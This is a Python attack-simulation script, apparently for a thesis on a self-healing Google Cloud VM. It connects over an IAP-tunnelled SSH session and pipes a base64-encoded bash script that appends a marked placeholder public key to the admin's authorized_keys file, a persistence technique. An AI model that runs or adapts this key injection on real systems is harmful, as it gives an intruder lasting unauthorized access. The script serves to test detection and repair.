import base64
import json
import subprocess
import sys
from pathlib import Path


PROJECT_ROOT = Path(__file__).resolve().parents[1]
STATE_FILE = PROJECT_ROOT / "controller" / "ssh_rotation_state.json"

TARGET_HOST = "thesis-self-healing-vm"
TARGET_USER = "thesisadmin"
ZONE = "europe-west1-b"
PROJECT_ID = "project-207ee30d-2273-45b0-8a0"

ATTACK_MARKER = "THESIS_UNAUTHORIZED_SSH_KEY"
UNAUTHORIZED_KEY = (
    "ssh-rsa "
    "AAAAB3NzaC1yc2EAAAADAQABAAABAQC7ThesisUnauthorizedKey"
    "PersistenceEvaluationOnly000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000 "
    f"{ATTACK_MARKER}"
)


def get_current_private_key():
    if not STATE_FILE.exists():
        raise FileNotFoundError(
            f"SSH rotation state not found: {STATE_FILE}"
        )

    state = json.loads(
        STATE_FILE.read_text(encoding="utf-8-sig")
    )

    private_key_value = state.get("new_private_key")

    if not private_key_value:
        raise ValueError(
            "new_private_key missing from SSH rotation state."
        )

    private_key = Path(private_key_value)

    if not private_key.exists():
        raise FileNotFoundError(
            f"Current SSH private key not found: {private_key}"
        )

    return private_key


def main():
    private_key = get_current_private_key()

    encoded_key = base64.b64encode(
        UNAUTHORIZED_KEY.encode("utf-8")
    ).decode("ascii")

    attack_script = rf'''set -e

AUTHORIZED_KEYS="/home/{TARGET_USER}/.ssh/authorized_keys"
ATTACK_MARKER="{ATTACK_MARKER}"
ENCODED_KEY="{encoded_key}"

if grep -Fq "$ATTACK_MARKER" "$AUTHORIZED_KEYS"; then
    echo UNAUTHORIZED_SSH_KEY_ALREADY_PRESENT
    exit 1
fi

echo "$ENCODED_KEY" | base64 -d >> "$AUTHORIZED_KEYS"
echo >> "$AUTHORIZED_KEYS"

chmod 600 "$AUTHORIZED_KEYS"

if ! grep -Fq "$ATTACK_MARKER" "$AUTHORIZED_KEYS"; then
    echo UNAUTHORIZED_SSH_KEY_NOT_CONFIRMED
    exit 1
fi

echo "=== AUTHORIZED_KEYS MATCH ==="
grep -F "$ATTACK_MARKER" "$AUTHORIZED_KEYS"

echo UNAUTHORIZED_SSH_PUBLIC_KEY_CREATED
'''

    encoded_script = base64.b64encode(
        attack_script.encode("utf-8")
    ).decode("ascii")

    proxy_command = (
        "gcloud.cmd compute start-iap-tunnel "
        f"{TARGET_HOST} %p "
        "--listen-on-stdin "
        f"--zone={ZONE} "
        f"--project={PROJECT_ID}"
    )

    command = [
        "ssh",
        "-o", "BatchMode=yes",
        "-o", "IdentitiesOnly=yes",
        "-o", "ConnectTimeout=15",
        "-o", "ConnectionAttempts=1",
        "-o", "StrictHostKeyChecking=accept-new",
        "-i", str(private_key),
        "-o", f"ProxyCommand={proxy_command}",
        f"{TARGET_USER}@{TARGET_HOST}",
        f"echo {encoded_script} | base64 -d | bash",
    ]

    print("[INFO] Injecting unauthorized SSH public key...")

    process = subprocess.run(
        command,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=90,
    )

    if process.stdout:
        print(process.stdout.strip())

    if process.stderr:
        print(process.stderr.strip())

    if (
        process.returncode != 0
        or "UNAUTHORIZED_SSH_PUBLIC_KEY_CREATED"
        not in process.stdout
    ):
        print(
            "[ERROR] Unauthorized SSH public-key persistence "
            "was not confirmed."
        )
        return 1

    print(
        "[SUCCESS] Unauthorized SSH public-key persistence created."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
